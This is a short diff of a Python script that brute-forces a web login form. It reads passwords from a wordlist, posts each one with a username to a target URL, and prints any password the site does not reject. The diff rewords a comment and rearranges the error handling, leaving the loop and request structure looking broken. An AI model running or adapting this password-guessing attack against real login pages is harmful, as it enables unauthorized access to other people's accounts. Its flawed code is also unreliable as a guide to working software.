@@ -28,7 +28,7 @@ try:
 except FileNotFoundError:
     cprint("The file was not found...", 'red')
 
-# now let's get each password in the password_file
+# Now the program will try all passwords in the password file
 
 try:
     for password in file.readlines():
@@ -36,13 +36,11 @@ try:
 
     data = {'username':username, 'password':password, "Login":'submit'}
     send_data_url = requests.post(url, data=data)
-except:
-    cprint("The file could not be read...", 'red')
 
-try:
     if "Login failed" in str(send_data_url.content):
         cprint("[*] Attempting password: %s" % password, 'red')
     else:
         cprint("[*] Password found: %s " % password,'green')
+
 except:
     cprint("There was an error, please try again..", 'red')
